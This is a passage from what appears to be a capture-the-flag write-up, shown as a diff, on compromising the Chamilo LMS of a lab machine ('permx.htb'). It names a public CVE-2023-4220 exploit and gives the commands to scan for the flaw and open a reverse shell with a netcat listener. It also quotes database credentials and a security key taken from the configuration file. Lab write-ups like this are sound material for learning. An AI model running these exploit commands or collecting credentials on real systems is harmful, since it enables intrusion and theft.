@@ -49,4 +49,27 @@ We found www and lms, add them to /etc/hosts and let's try to connect to them.
 www seems to referencing to the primary website.
 lms insteam took us to a login panel "chamilo"
 
-  
+Searching online we find a CVE related to chamilo:
+https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS
+
+In it we find a main.py, as explained in the github page we launch a scan:
+python3 main.py -u http://lms.permx.htb -a scan
+
+We got a "likely vulnerable", so we try the rev shell:
+python3 main.py -u http://lms.permx.htb -a revshell
+
+We start netcat on 443 and we continue the prompt of the revshell giving the info of the revshell ip and port.
+
+And, here we go we have a rev shell!
+
+Searching on internet we found that Chamilo's config file are located under Chamilo/app/, infact we found a configuration.php file with these juice info in:
+// Database connection settings.
+$_configuration['db_host'] = 'localhost';
+$_configuration['db_port'] = '3306';
+$_configuration['main_database'] = 'chamilo';
+$_configuration['db_user'] = 'chamilo';
+$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+// Security word for password recovery
+$_configuration['security_key'] = '08ecc755d674efaa6b1ab289e6053a9b';
+
+
